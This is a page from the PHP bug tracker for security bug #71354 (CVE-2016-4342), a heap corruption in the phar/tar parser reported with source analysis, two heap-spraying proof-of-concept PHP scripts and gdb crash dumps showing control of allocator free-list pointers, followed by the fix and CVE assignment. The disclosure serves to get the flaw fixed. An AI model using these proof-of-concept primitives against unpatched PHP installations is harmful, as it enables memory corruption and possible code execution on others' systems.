@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='PHAR related Bug #71354 - RDF' href='rss/bug.php?id=71354'>
+        <link rel='alternate' type='application/rss+xml' title='PHAR related Bug #71354 - RSS 2.0' href='rss/bug.php?id=71354&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #71354 :: Heap corruption in tar/zip/phar parser.</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=71354">Sec Bug</a>&nbsp;#71354</th>
+            <td id="summary" colspan="5">Heap corruption in tar/zip/phar parser.</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2016-01-12 20:46 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2016-04-28 16:59 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=PHAR+related">PHAR related</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>5.5.31</td>
+            <th class="details">OS:</th>
+            <td>Linux, Mac</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4342" target="_blank">2016-4342</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=71354&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=71354&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=71354&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1452631581">&nbsp;</a><strong>[2016-01-12 20:46 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
+<pre class='note'>Description:
+------------
+There is an issue when parsing .tar/.zip./.phar file.
+
+Assume that, I have a .tar file with empty file &quot;aaaa&quot; (0 byte), so its uncompressed_filesize is 0.
+
+then we dump its content through getContent() method of PharFileInfo like:
+
+var_dump($phar['aaaa']-&gt;getContent();
+
+Okie now we're gonna check inside of this method.
+
+
+------------------------------
+ext/phar/phar_object.c:
+
+PHP_METHOD(PharFileInfo, getContent)
+{
+...snip...
+	Z_TYPE_P(return_value) = IS_STRING;
+	Z_STRLEN_P(return_value) = php_stream_copy_to_mem(fp, &amp;(Z_STRVAL_P(return_value)), link-&gt;uncompressed_filesize, 0);
+
+	if (!Z_STRVAL_P(return_value)) {
+		Z_STRVAL_P(return_value) = estrndup(&quot;&quot;, 0);
+	}
+...
+}
+
+Remember that uncompress_filesize is 0, so it is passed into php_stream_copy_to_mem function through 3rd parameter.
+
+------------------------------
+
+main/streams/streams.c:
+
+PHPAPI size_t _php_stream_copy_to_mem(php_stream *src, char **buf, size_t maxlen, int persistent STREAMS_DC TSRMLS_DC)
+{
+...snip...
+	if (maxlen == 0) {
+		return 0;
+	}
+...
+	if (maxlen &gt; 0) {
+		ptr = *buf = pemalloc_rel_orig(maxlen + 1, persistent);
+		while ((len &lt; maxlen) &amp;&amp; !php_stream_eof(src)) {
+			ret = php_stream_read(src, ptr, maxlen - len);
+...
+}
+
+
+You can see them above.
+
+If maxlen == 0, then it returns 0 and there is nothing to happens. Otherwise, *buf (2nd args) will be assigned by heap allocation, and read data from current file pointer normally.
+
+Ok get back to our situation.
+
+
+------------------------------
+
+
+But our issues is...zval `return_value` is &quot;uninitialized variable&quot;, return_value-&gt;str.val is some pointer on old stack frame in function's context which is called previously. You can see it below through gdb:
+
+
+------------------------------
+=&gt; 0x817aacc &lt;zim_PharFileInfo_getContent+300&gt;: call   0x8267ad0 &lt;_php_stream_copy_to_mem&gt;
+   0x817aad1 &lt;zim_PharFileInfo_getContent+305&gt;: mov    ecx,DWORD PTR [esp+0x54]
+   0x817aad5 &lt;zim_PharFileInfo_getContent+309&gt;: mov    DWORD PTR [ecx+0x4],eax
+   0x817aad8 &lt;zim_PharFileInfo_getContent+312&gt;: mov    eax,DWORD PTR [ecx]
+   0x817aada &lt;zim_PharFileInfo_getContent+314&gt;: test   eax,eax
+Guessed arguments:
+arg[0]: 0xf7bd9a04 --&gt; 0x8806a40 --&gt; 0x826cad0 (&lt;php_stdiop_write&gt;:     push   ebx)
+arg[1]: 0xf7bdd4b8 --&gt; 0xf7bdd56c --&gt; 0x1d 
+arg[2]: 0x0 
+arg[3]: 0x0 
+
+Breakpoint 2, 0x0817aacc in zim_PharFileInfo_getContent (ht=0x0, return_value=0xf7bdd4b8, return_value_ptr=0xf7bbf094, this_ptr=0xf7bdd49c, return_value_used=0x1) at /root/fuzz/php-5.6.17/ext/phar/phar_object.c:4889
+4889            Z_STRLEN_P(return_value) = php_stream_copy_to_mem(fp, &amp;(Z_STRVAL_P(return_value)), link-&gt;uncompressed_filesize, 0);
+
+------------------------------
+
+
+&quot;0xf7bdd56c&quot; is current return_value-&gt;str.val.
+
+So as I described earlier, if maxlen == 0 then &lt;_php_stream_copy_to_mem&gt; will return 0 and nothing is assigned to *buf (2nd parameter) =&gt; return_value-&gt;str.val will be old-value after this call !!!
+
+See below.
+------------------------------
+=&gt; 0x817aad1 &lt;zim_PharFileInfo_getContent+305&gt;: mov    ecx,DWORD PTR [esp+0x54]
+   0x817aad5 &lt;zim_PharFileInfo_getContent+309&gt;: mov    DWORD PTR [ecx+0x4],eax
+   0x817aad8 &lt;zim_PharFileInfo_getContent+312&gt;: mov    eax,DWORD PTR [ecx]
+   0x817aada &lt;zim_PharFileInfo_getContent+314&gt;: test   eax,eax
+   0x817aadc &lt;zim_PharFileInfo_getContent+316&gt;: jne    0x817aa21 &lt;zim_PharFileInfo_getContent+129&gt;
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0817aad1      4889            Z_STRLEN_P(return_value) = php_stream_copy_to_mem(fp, &amp;(Z_STRVAL_P(return_value)), link-&gt;uncompressed_filesize, 0);
+gdb-peda$ x/10wx 0xf7bdd4b8
+0xf7bdd4b8:     0xf7bdd56c      0x088086a0      0x00000001      0x00000006
+0xf7bdd4c8:     0x00000000      0x00000010      0x0000001d      0x08820b20
+0xf7bdd4d8:     0xf7bd97c4      0x00000091
+gdb-peda$ print *(zval*)0xf7bdd4b8
+$2 = {
+  value = {
+    lval = 0xf7bdd56c, 
+    dval = 1.0010109254636237e-267, 
+    str = {
+      val = 0xf7bdd56c &quot;\035&quot;, 
+      len = 0x88086a0
+    }, 
+    ht = 0xf7bdd56c, 
+    obj = {
+      handle = 0xf7bdd56c, 
+      handlers = 0x88086a0 &lt;spl_filesystem_object_handlers&gt;
+    }, 
+    ast = 0xf7bdd56c
+  }, 
+  refcount__gc = 0x1, 
+  type = 0x6, 
+  is_ref__gc = 0x0
+}
+------------------------------
+
+0xf7bdd56c still be in ZVAL(return_value).
+
+Later, this str.val pointer will be passed into _efree to do clear vm stack.
+
+So, by somehow, I've managed to control previous block of 0xf7bdd56c, and absolutely can control next_block of mm_block (ESI register). Please scroll and see it below. 
+
+
+------------------------------
+zend_alloc.c:
+
+static void _zend_mm_free_int(zend_mm_heap *heap, void *p ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
+{
+...
+
+	next_block = ZEND_MM_BLOCK_AT(mm_block, size);
+	if (ZEND_MM_IS_FREE_BLOCK(next_block)) {
+		zend_mm_remove_from_free_list(heap, (zend_mm_free_block *) next_block);
+		size += ZEND_MM_FREE_BLOCK_SIZE(next_block);
+	}
+...
+
+
+We can take over this next_block and probably control heap further.
+
+
+
+
+* Notice:
+- This poc may not work to you, it bases on stack/heap data. If it doesnt, please do some stuff to spray the heap.
+- Affects 
+- PoC can run on 32 and 64bit.
+- Works on Linux and Mac as well. 
+
+
+* Fix
+- We should init ZVAL(return_val) before get in &lt;php_stream_copy_to_mem&gt;.
+
+
+
+
+Test script:
+---------------
+&lt;?php
+
+echo &quot;Making .tar file...\n&quot;;
+
+$phar = new PharData('poc.tar');
+$phar-&gt;addFromString('aaaa','');
+
+echo &quot;Trigger...\n&quot;;
+
+//prepare
+$spray = pack('IIII',0x41414141,0x42424242,0x43434343,0x4444444);
+$spray = $spray.$spray.$spray.$spray.$spray.$spray.$spray.$spray;
+$pointer = pack('I',0x13371337);
+
+
+$p = new PharData($argv[1]);
+
+// heap spray 
+$a[] = $spray.(string)0;
+$a[] = $spray.(string)1;
+$a[] = $spray.(string)2;
+$a[] = $spray.(string)3;
+$a[] = $spray.(string)4;
+$a[] = $spray.$pointer.(string)5;
+
+var_dump($p['aaaa']-&gt;getContent());
+
+// If this poc doesnt work, please un-comment line below.
+// var_dump($p);
+?&gt;
+
+At the first run, it would try to make poc.tar which contains empty file named &quot;aaaa&quot;.
+Then run &quot;./sapi/cli/php ./poc.php ./poc.tar&quot;.
+
+
+
+Expected result:
+----------------
+Program received signal SIGSEGV, Segmentation fault.
+
+And we could control next_block (see $ESI register) of mm_block at zend_alloc.c:947
+
+then we probably control heap memory to leak/write somewhere we want.
+
+Actual result:
+--------------
+gdb-peda$ r
+Starting program: /root/test/php-5.6.17/sapi/cli/php ./poc.php ./poc.tar
+Making .tar file...
+Trigger...
+string(0) &quot;&quot;
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0xaf4e898 
+EBX: 0x8804000 --&gt; 0x8803dd8 --&gt; 0x1 
+ECX: 0xf7bdd564 --&gt; 0x13371337 
+EDX: 0xf7bdd56c --&gt; 0x1d 
+ESI: 0x13371334 
+EDI: 0xf7bdd56c --&gt; 0x1d 
+EBP: 0x8820a58 --&gt; 0x1 
+ESP: 0xffffa020 --&gt; 0x82e15f7 (&lt;zend_objects_store_del_ref_by_handle_ex+7&gt;:     add    ebx,0x522a09)
+EIP: 0x82893cb (&lt;_zend_mm_free_int+123&gt;:        test   BYTE PTR [eax],0x1)
+EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x82893c2 &lt;_zend_mm_free_int+114&gt;:   mov    eax,DWORD PTR [esp+0x8]
+   0x82893c6 &lt;_zend_mm_free_int+118&gt;:   sub    DWORD PTR [ebp+0x34],esi
+   0x82893c9 &lt;_zend_mm_free_int+121&gt;:   add    eax,esi
+=&gt; 0x82893cb &lt;_zend_mm_free_int+123&gt;:   test   BYTE PTR [eax],0x1
+   0x82893ce &lt;_zend_mm_free_int+126&gt;:   mov    DWORD PTR [esp+0xc],eax
+   0x82893d2 &lt;_zend_mm_free_int+130&gt;:   je     0x8289429 &lt;_zend_mm_free_int+217&gt;
+   0x82893d4 &lt;_zend_mm_free_int+132&gt;:   mov    eax,DWORD PTR [edi-0x4]
+   0x82893d7 &lt;_zend_mm_free_int+135&gt;:   test   al,0x1
+[------------------------------------stack-------------------------------------]
+0000| 0xffffa020 --&gt; 0x82e15f7 (&lt;zend_objects_store_del_ref_by_handle_ex+7&gt;:    add    ebx,0x522a09)
+0004| 0xffffa024 --&gt; 0x8804000 --&gt; 0x8803dd8 --&gt; 0x1 
+0008| 0xffffa028 --&gt; 0xf7bdd564 --&gt; 0x13371337 
+0012| 0xffffa02c --&gt; 0x8804000 --&gt; 0x8803dd8 --&gt; 0x1 
+0016| 0xffffa030 --&gt; 0x1 
+0020| 0xffffa034 --&gt; 0x881e740 --&gt; 0x0 
+0024| 0xffffa038 --&gt; 0x88428c8 --&gt; 0x1 
+0028| 0xffffa03c --&gt; 0x8804000 --&gt; 0x8803dd8 --&gt; 0x1 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+_zend_mm_free_int (heap=0x8820a58, p=p@entry=0xf7bdd56c) at /root/test/php-5.6.17/Zend/zend_alloc.c:2104
+2104            if (ZEND_MM_IS_FREE_BLOCK(next_block)) {
+gdb-peda$ print p
+$1 = (void *) 0xf7bdd56c
+gdb-peda$ x/10wx p-8
+0xf7bdd564:     0x13371337      0x00000035      0x0000001d      0x00000091
+0xf7bdd574:     0xf7bdd5a4      0x088086a0      0x00000000      0x00000005
+0xf7bdd584:     0x00000000      0x0000001d
+gdb-peda$ x/10wx p-16
+0xf7bdd55c:     0x43434343      0x04444444      0x13371337      0x00000035
+0xf7bdd56c:     0x0000001d      0x00000091      0xf7bdd5a4      0x088086a0
+0xf7bdd57c:     0x00000000      0x00000005
+gdb-peda$ bt
+#0  _zend_mm_free_int (heap=0x8820a58, p=p@entry=0xf7bdd56c) at /root/test/php-5.6.17/Zend/zend_alloc.c:2104
+#1  0x0828b7d8 in _efree (ptr=0xf7bdd56c) at /root/test/php-5.6.17/Zend/zend_alloc.c:2440
+#2  0x082b22dc in _zval_dtor_func (zvalue=zvalue@entry=0xf7bdd4b8) at /root/test/php-5.6.17/Zend/zend_variables.c:46
+#3  0x08361378 in _zval_dtor (zvalue=0xf7bdd4b8) at /root/test/php-5.6.17/Zend/zend_variables.h:35
+#4  i_zval_ptr_dtor (zval_ptr=0xf7bdd4b8) at /root/test/php-5.6.17/Zend/zend_execute.h:79
+#5  zend_vm_stack_clear_multiple (nested=0x0) at /root/test/php-5.6.17/Zend/zend_execute.h:308
+#6  zend_do_fcall_common_helper_SPEC (execute_data=&lt;optimized out&gt;) at /root/test/php-5.6.17/Zend/zend_vm_execute.h:650
+#7  0x082f1446 in execute_ex (execute_data=execute_data@entry=0xf7bbf3c0) at /root/test/php-5.6.17/Zend/zend_vm_execute.h:363
+#8  0x0835f272 in zend_execute (op_array=0xf7bd8f44) at /root/test/php-5.6.17/Zend/zend_vm_execute.h:388
+#9  0x082b4c1e in zend_execute_scripts (type=type@entry=0x8, retval=retval@entry=0x0, file_count=file_count@entry=0x3) at /root/test/php-5.6.17/Zend/zend.c:1341
+#10 0x0824ef3e in php_execute_script (primary_file=primary_file@entry=0xffffc438) at /root/test/php-5.6.17/main/main.c:2597
+#11 0x08363473 in do_cli (argc=argc@entry=0x3, argv=argv@entry=0x8820888) at /root/test/php-5.6.17/sapi/cli/php_cli.c:994
+#12 0x08063f04 in main (argc=0x3, argv=0x8820888) at /root/test/php-5.6.17/sapi/cli/php_cli.c:1378
+#13 0xf7c40a83 in __libc_start_main (main=0x80639f0 &lt;main&gt;, argc=0x3, argv=0xffffd744, init=0x836c520 &lt;__libc_csu_init&gt;, fini=0x836c590 &lt;__libc_csu_fini&gt;, rtld_fini=0xf7feb180 &lt;_dl_fini&gt;, stack_end=0xffffd73c) at libc-start.c:287
+#14 0x08063f8a in _start ()
+gdb-peda$ 
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=71354'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=71354'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_comment' ><a name="1452658973">&nbsp;</a><strong>[2016-01-13 04:22 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
+<pre class='note'>I've made a new PoC which take over prev/next block with arbitrary value. 
+
+---------------------------------
+&lt;?php
+
+echo &quot;Making .tar file...\n&quot;;
+
+$phar = new PharData('poc.tar');
+$phar-&gt;addFromString('aaaa','');
+
+echo &quot;Trigger...\n&quot;;
+
+//prepare
+$spray = pack('IIII',0x41414141,0x42424242,0x43434343,0x4444444);
+$spray = $spray.$spray.$spray.$spray.$spray.$spray.$spray.$spray;
+$pointer = pack('I',-17); // offset
+
+
+$p = new PharData($argv[1]);
+
+// heap spray 
+$a[] = $spray.(string)0;
+$a[] = $spray.(string)1;
+$a[] = $spray.(string)2;
+$a[] = $spray.(string)3;
+$a[] = $spray.(string)4;
+$a[] = $spray.$pointer.(string)5;
+
+var_dump($p['aaaa']-&gt;getContent());
+
+?&gt;
+
+----------------------------
+CRASH SUMMARY
+
+
+gdb-peda$ c
+Continuing.
+string(0) &quot;&quot;
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x8820a58 --&gt; 0x1 
+EBX: 0x8804000 --&gt; 0x8803dd8 --&gt; 0x1 
+ECX: 0x42424242 ('BBBB')
+EDX: 0xf7bdd550 --&gt; 0x4444444 
+ESI: 0x43434343 ('CCCC')
+EDI: 0xf7bdd56c --&gt; 0x1d 
+EBP: 0x8820a58 --&gt; 0x1 
+ESP: 0xffffa010 --&gt; 0xf7bddba0 --&gt; 0xf7bddb98 --&gt; 0x1f468 
+EIP: 0x82892d0 (&lt;zend_mm_remove_from_free_list+208&gt;:    cmp    edx,DWORD PTR [ecx+0xc])
+EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x82892c5 &lt;zend_mm_remove_from_free_list+197&gt;:       add    ecx,0x18
+   0x82892c8 &lt;zend_mm_remove_from_free_list+200&gt;:       mov    DWORD PTR [eax+0x10],ecx
+   0x82892cb &lt;zend_mm_remove_from_free_list+203&gt;:       jmp    0x8289248 &lt;zend_mm_remove_from_free_list+72&gt;
+=&gt; 0x82892d0 &lt;zend_mm_remove_from_free_list+208&gt;:       cmp    edx,DWORD PTR [ecx+0xc]
+   0x82892d3 &lt;zend_mm_remove_from_free_list+211&gt;:       jne    0x8289260 &lt;zend_mm_remove_from_free_list+96&gt;
+   0x82892d5 &lt;zend_mm_remove_from_free_list+213&gt;:       cmp    edx,DWORD PTR [esi+0x8]
+   0x82892d8 &lt;zend_mm_remove_from_free_list+216&gt;:       jne    0x8289260 &lt;zend_mm_remove_from_free_list+96&gt;
+   0x82892da &lt;zend_mm_remove_from_free_list+218&gt;:       mov    edi,DWORD PTR [edx]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffa010 --&gt; 0xf7bddba0 --&gt; 0xf7bddb98 --&gt; 0x1f468 
+0004| 0xffffa014 --&gt; 0xffffffec 
+0008| 0xffffa018 --&gt; 0xf7bdd56c --&gt; 0x1d 
+0012| 0xffffa01c --&gt; 0x8289432 (&lt;_zend_mm_free_int+226&gt;:        mov    eax,DWORD PTR [esp+0xc])
+0016| 0xffffa020 --&gt; 0x82e15f7 (&lt;zend_objects_store_del_ref_by_handle_ex+7&gt;:    add    ebx,0x522a09)
+0020| 0xffffa024 --&gt; 0x8804000 --&gt; 0x8803dd8 --&gt; 0x1 
+0024| 0xffffa028 --&gt; 0xf7bdd564 --&gt; 0xffffffef 
+0028| 0xffffa02c --&gt; 0xf7bdd550 --&gt; 0x4444444 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+zend_mm_remove_from_free_list (heap=0x8820a58, mm_block=0xf7bdd550) at /root/test/php-5.6.17/Zend/zend_alloc.c:837
+837                     if (UNEXPECTED(prev-&gt;next_free_block != mm_block) || UNEXPECTED(next-&gt;prev_free_block != mm_block)) {
+gdb-peda$ print prev
+$5 = (zend_mm_free_block *) 0x42424242
+gdb-peda$ print next
+$6 = (zend_mm_free_block *) 0x43434343
+gdb-peda$
+</pre>
+</div><div class='comment type_comment' ><a name="1452731821">&nbsp;</a><strong>[2016-01-14 00:37 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>The patch is in <a href="https://gist.github.com/smalyshev/80ba8551fb1e69f4e1ac" rel="nofollow">https://gist.github.com/smalyshev/80ba8551fb1e69f4e1ac</a> and security repo as 13ad4d3e971807f9a58ab5933182907dc2958539. Please verify.
+</pre>
+</div><div class='comment type_log' ><a name="1452732378">&nbsp;</a><strong>[2016-01-14 00:46 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+</div></div></div><div class='comment type_log' ><a name="1452732415">&nbsp;</a><strong>[2016-01-14 00:46 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-PHP Version: 5.6.17</span>
+<span class="added">+PHP Version: 5.5.31</span>
+</div></div></div><div class='comment type_comment' ><a name="1452748174">&nbsp;</a><strong>[2016-01-14 05:09 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
+<pre class='note'>Okay, bug is fixed.
+</pre>
+</div><div class='comment type_svn' ><a name="1454383171">&nbsp;</a><strong>[2016-02-02 03:19 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=13ad4d3e971807f9a58ab5933182907dc2958539" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=13ad4d3e971807f9a58ab5933182907dc2958539</a>
+Log: Fix <a href='bug.php?id=71354'>bug #71354</a> - remove UMR when size is 0
+</pre>
+</div><div class='comment type_log' ><a name="1454383171">&nbsp;</a><strong>[2016-02-02 03:19 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Assigned</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_svn' ><a name="1454384188">&nbsp;</a><strong>[2016-02-02 03:36 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=13ad4d3e971807f9a58ab5933182907dc2958539" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=13ad4d3e971807f9a58ab5933182907dc2958539</a>
+Log: Fix <a href='bug.php?id=71354'>bug #71354</a> - remove UMR when size is 0
+</pre>
+</div><div class='comment type_svn' ><a name="1454388399">&nbsp;</a><strong>[2016-02-02 04:46 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=13ad4d3e971807f9a58ab5933182907dc2958539" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=13ad4d3e971807f9a58ab5933182907dc2958539</a>
+Log: Fix <a href='bug.php?id=71354'>bug #71354</a> - remove UMR when size is 0
+</pre>
+</div><div class='comment type_comment' ><a name="1457358865">&nbsp;</a><strong>[2016-03-07 13:54 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
+<pre class='note'>hello folks,
+
+Can we assign a CVE for this ? :)
+</pre>
+</div><div class='comment type_log' ><a name="1461862757">&nbsp;</a><strong>[2016-04-28 16:59 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID: 2016-4342</span>
+</div></div></div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
